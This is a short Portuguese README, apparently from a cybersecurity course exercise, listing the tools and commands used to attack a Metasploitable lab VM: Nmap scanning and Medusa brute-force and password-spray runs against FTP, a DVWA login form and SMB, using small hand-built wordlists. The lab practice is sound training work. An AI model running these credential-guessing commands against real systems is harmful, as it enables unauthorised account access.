# DIO-Santander-Ciberseguran-a-2025
# Simulando Ataques com Kali Linux e Metaexploitable
# Algumas das ferramentas utilizadas:
- Virtual Box
- Kali Linux 
- Metaexploitable
- Nmap
- Medusa

Alguns dos comandos utilizados:

   ifconfig
   ping 192.168.56.101
   nmap -sV -p 21,22,80,445,139  192.168.56.101
   ftp 192.168.56.101
   echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
   echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
   medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
   medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login.php' \ -m FORM: 'username=USER&password=PASS&Login=Login' \ -m 'FAIL=Login failed' -t 6
   echo -e "user\nmsfadmin\nservice" > smb_users.txt
   echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
   medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
   smbclient -L //192.168.56.101 -U msfadmin
   
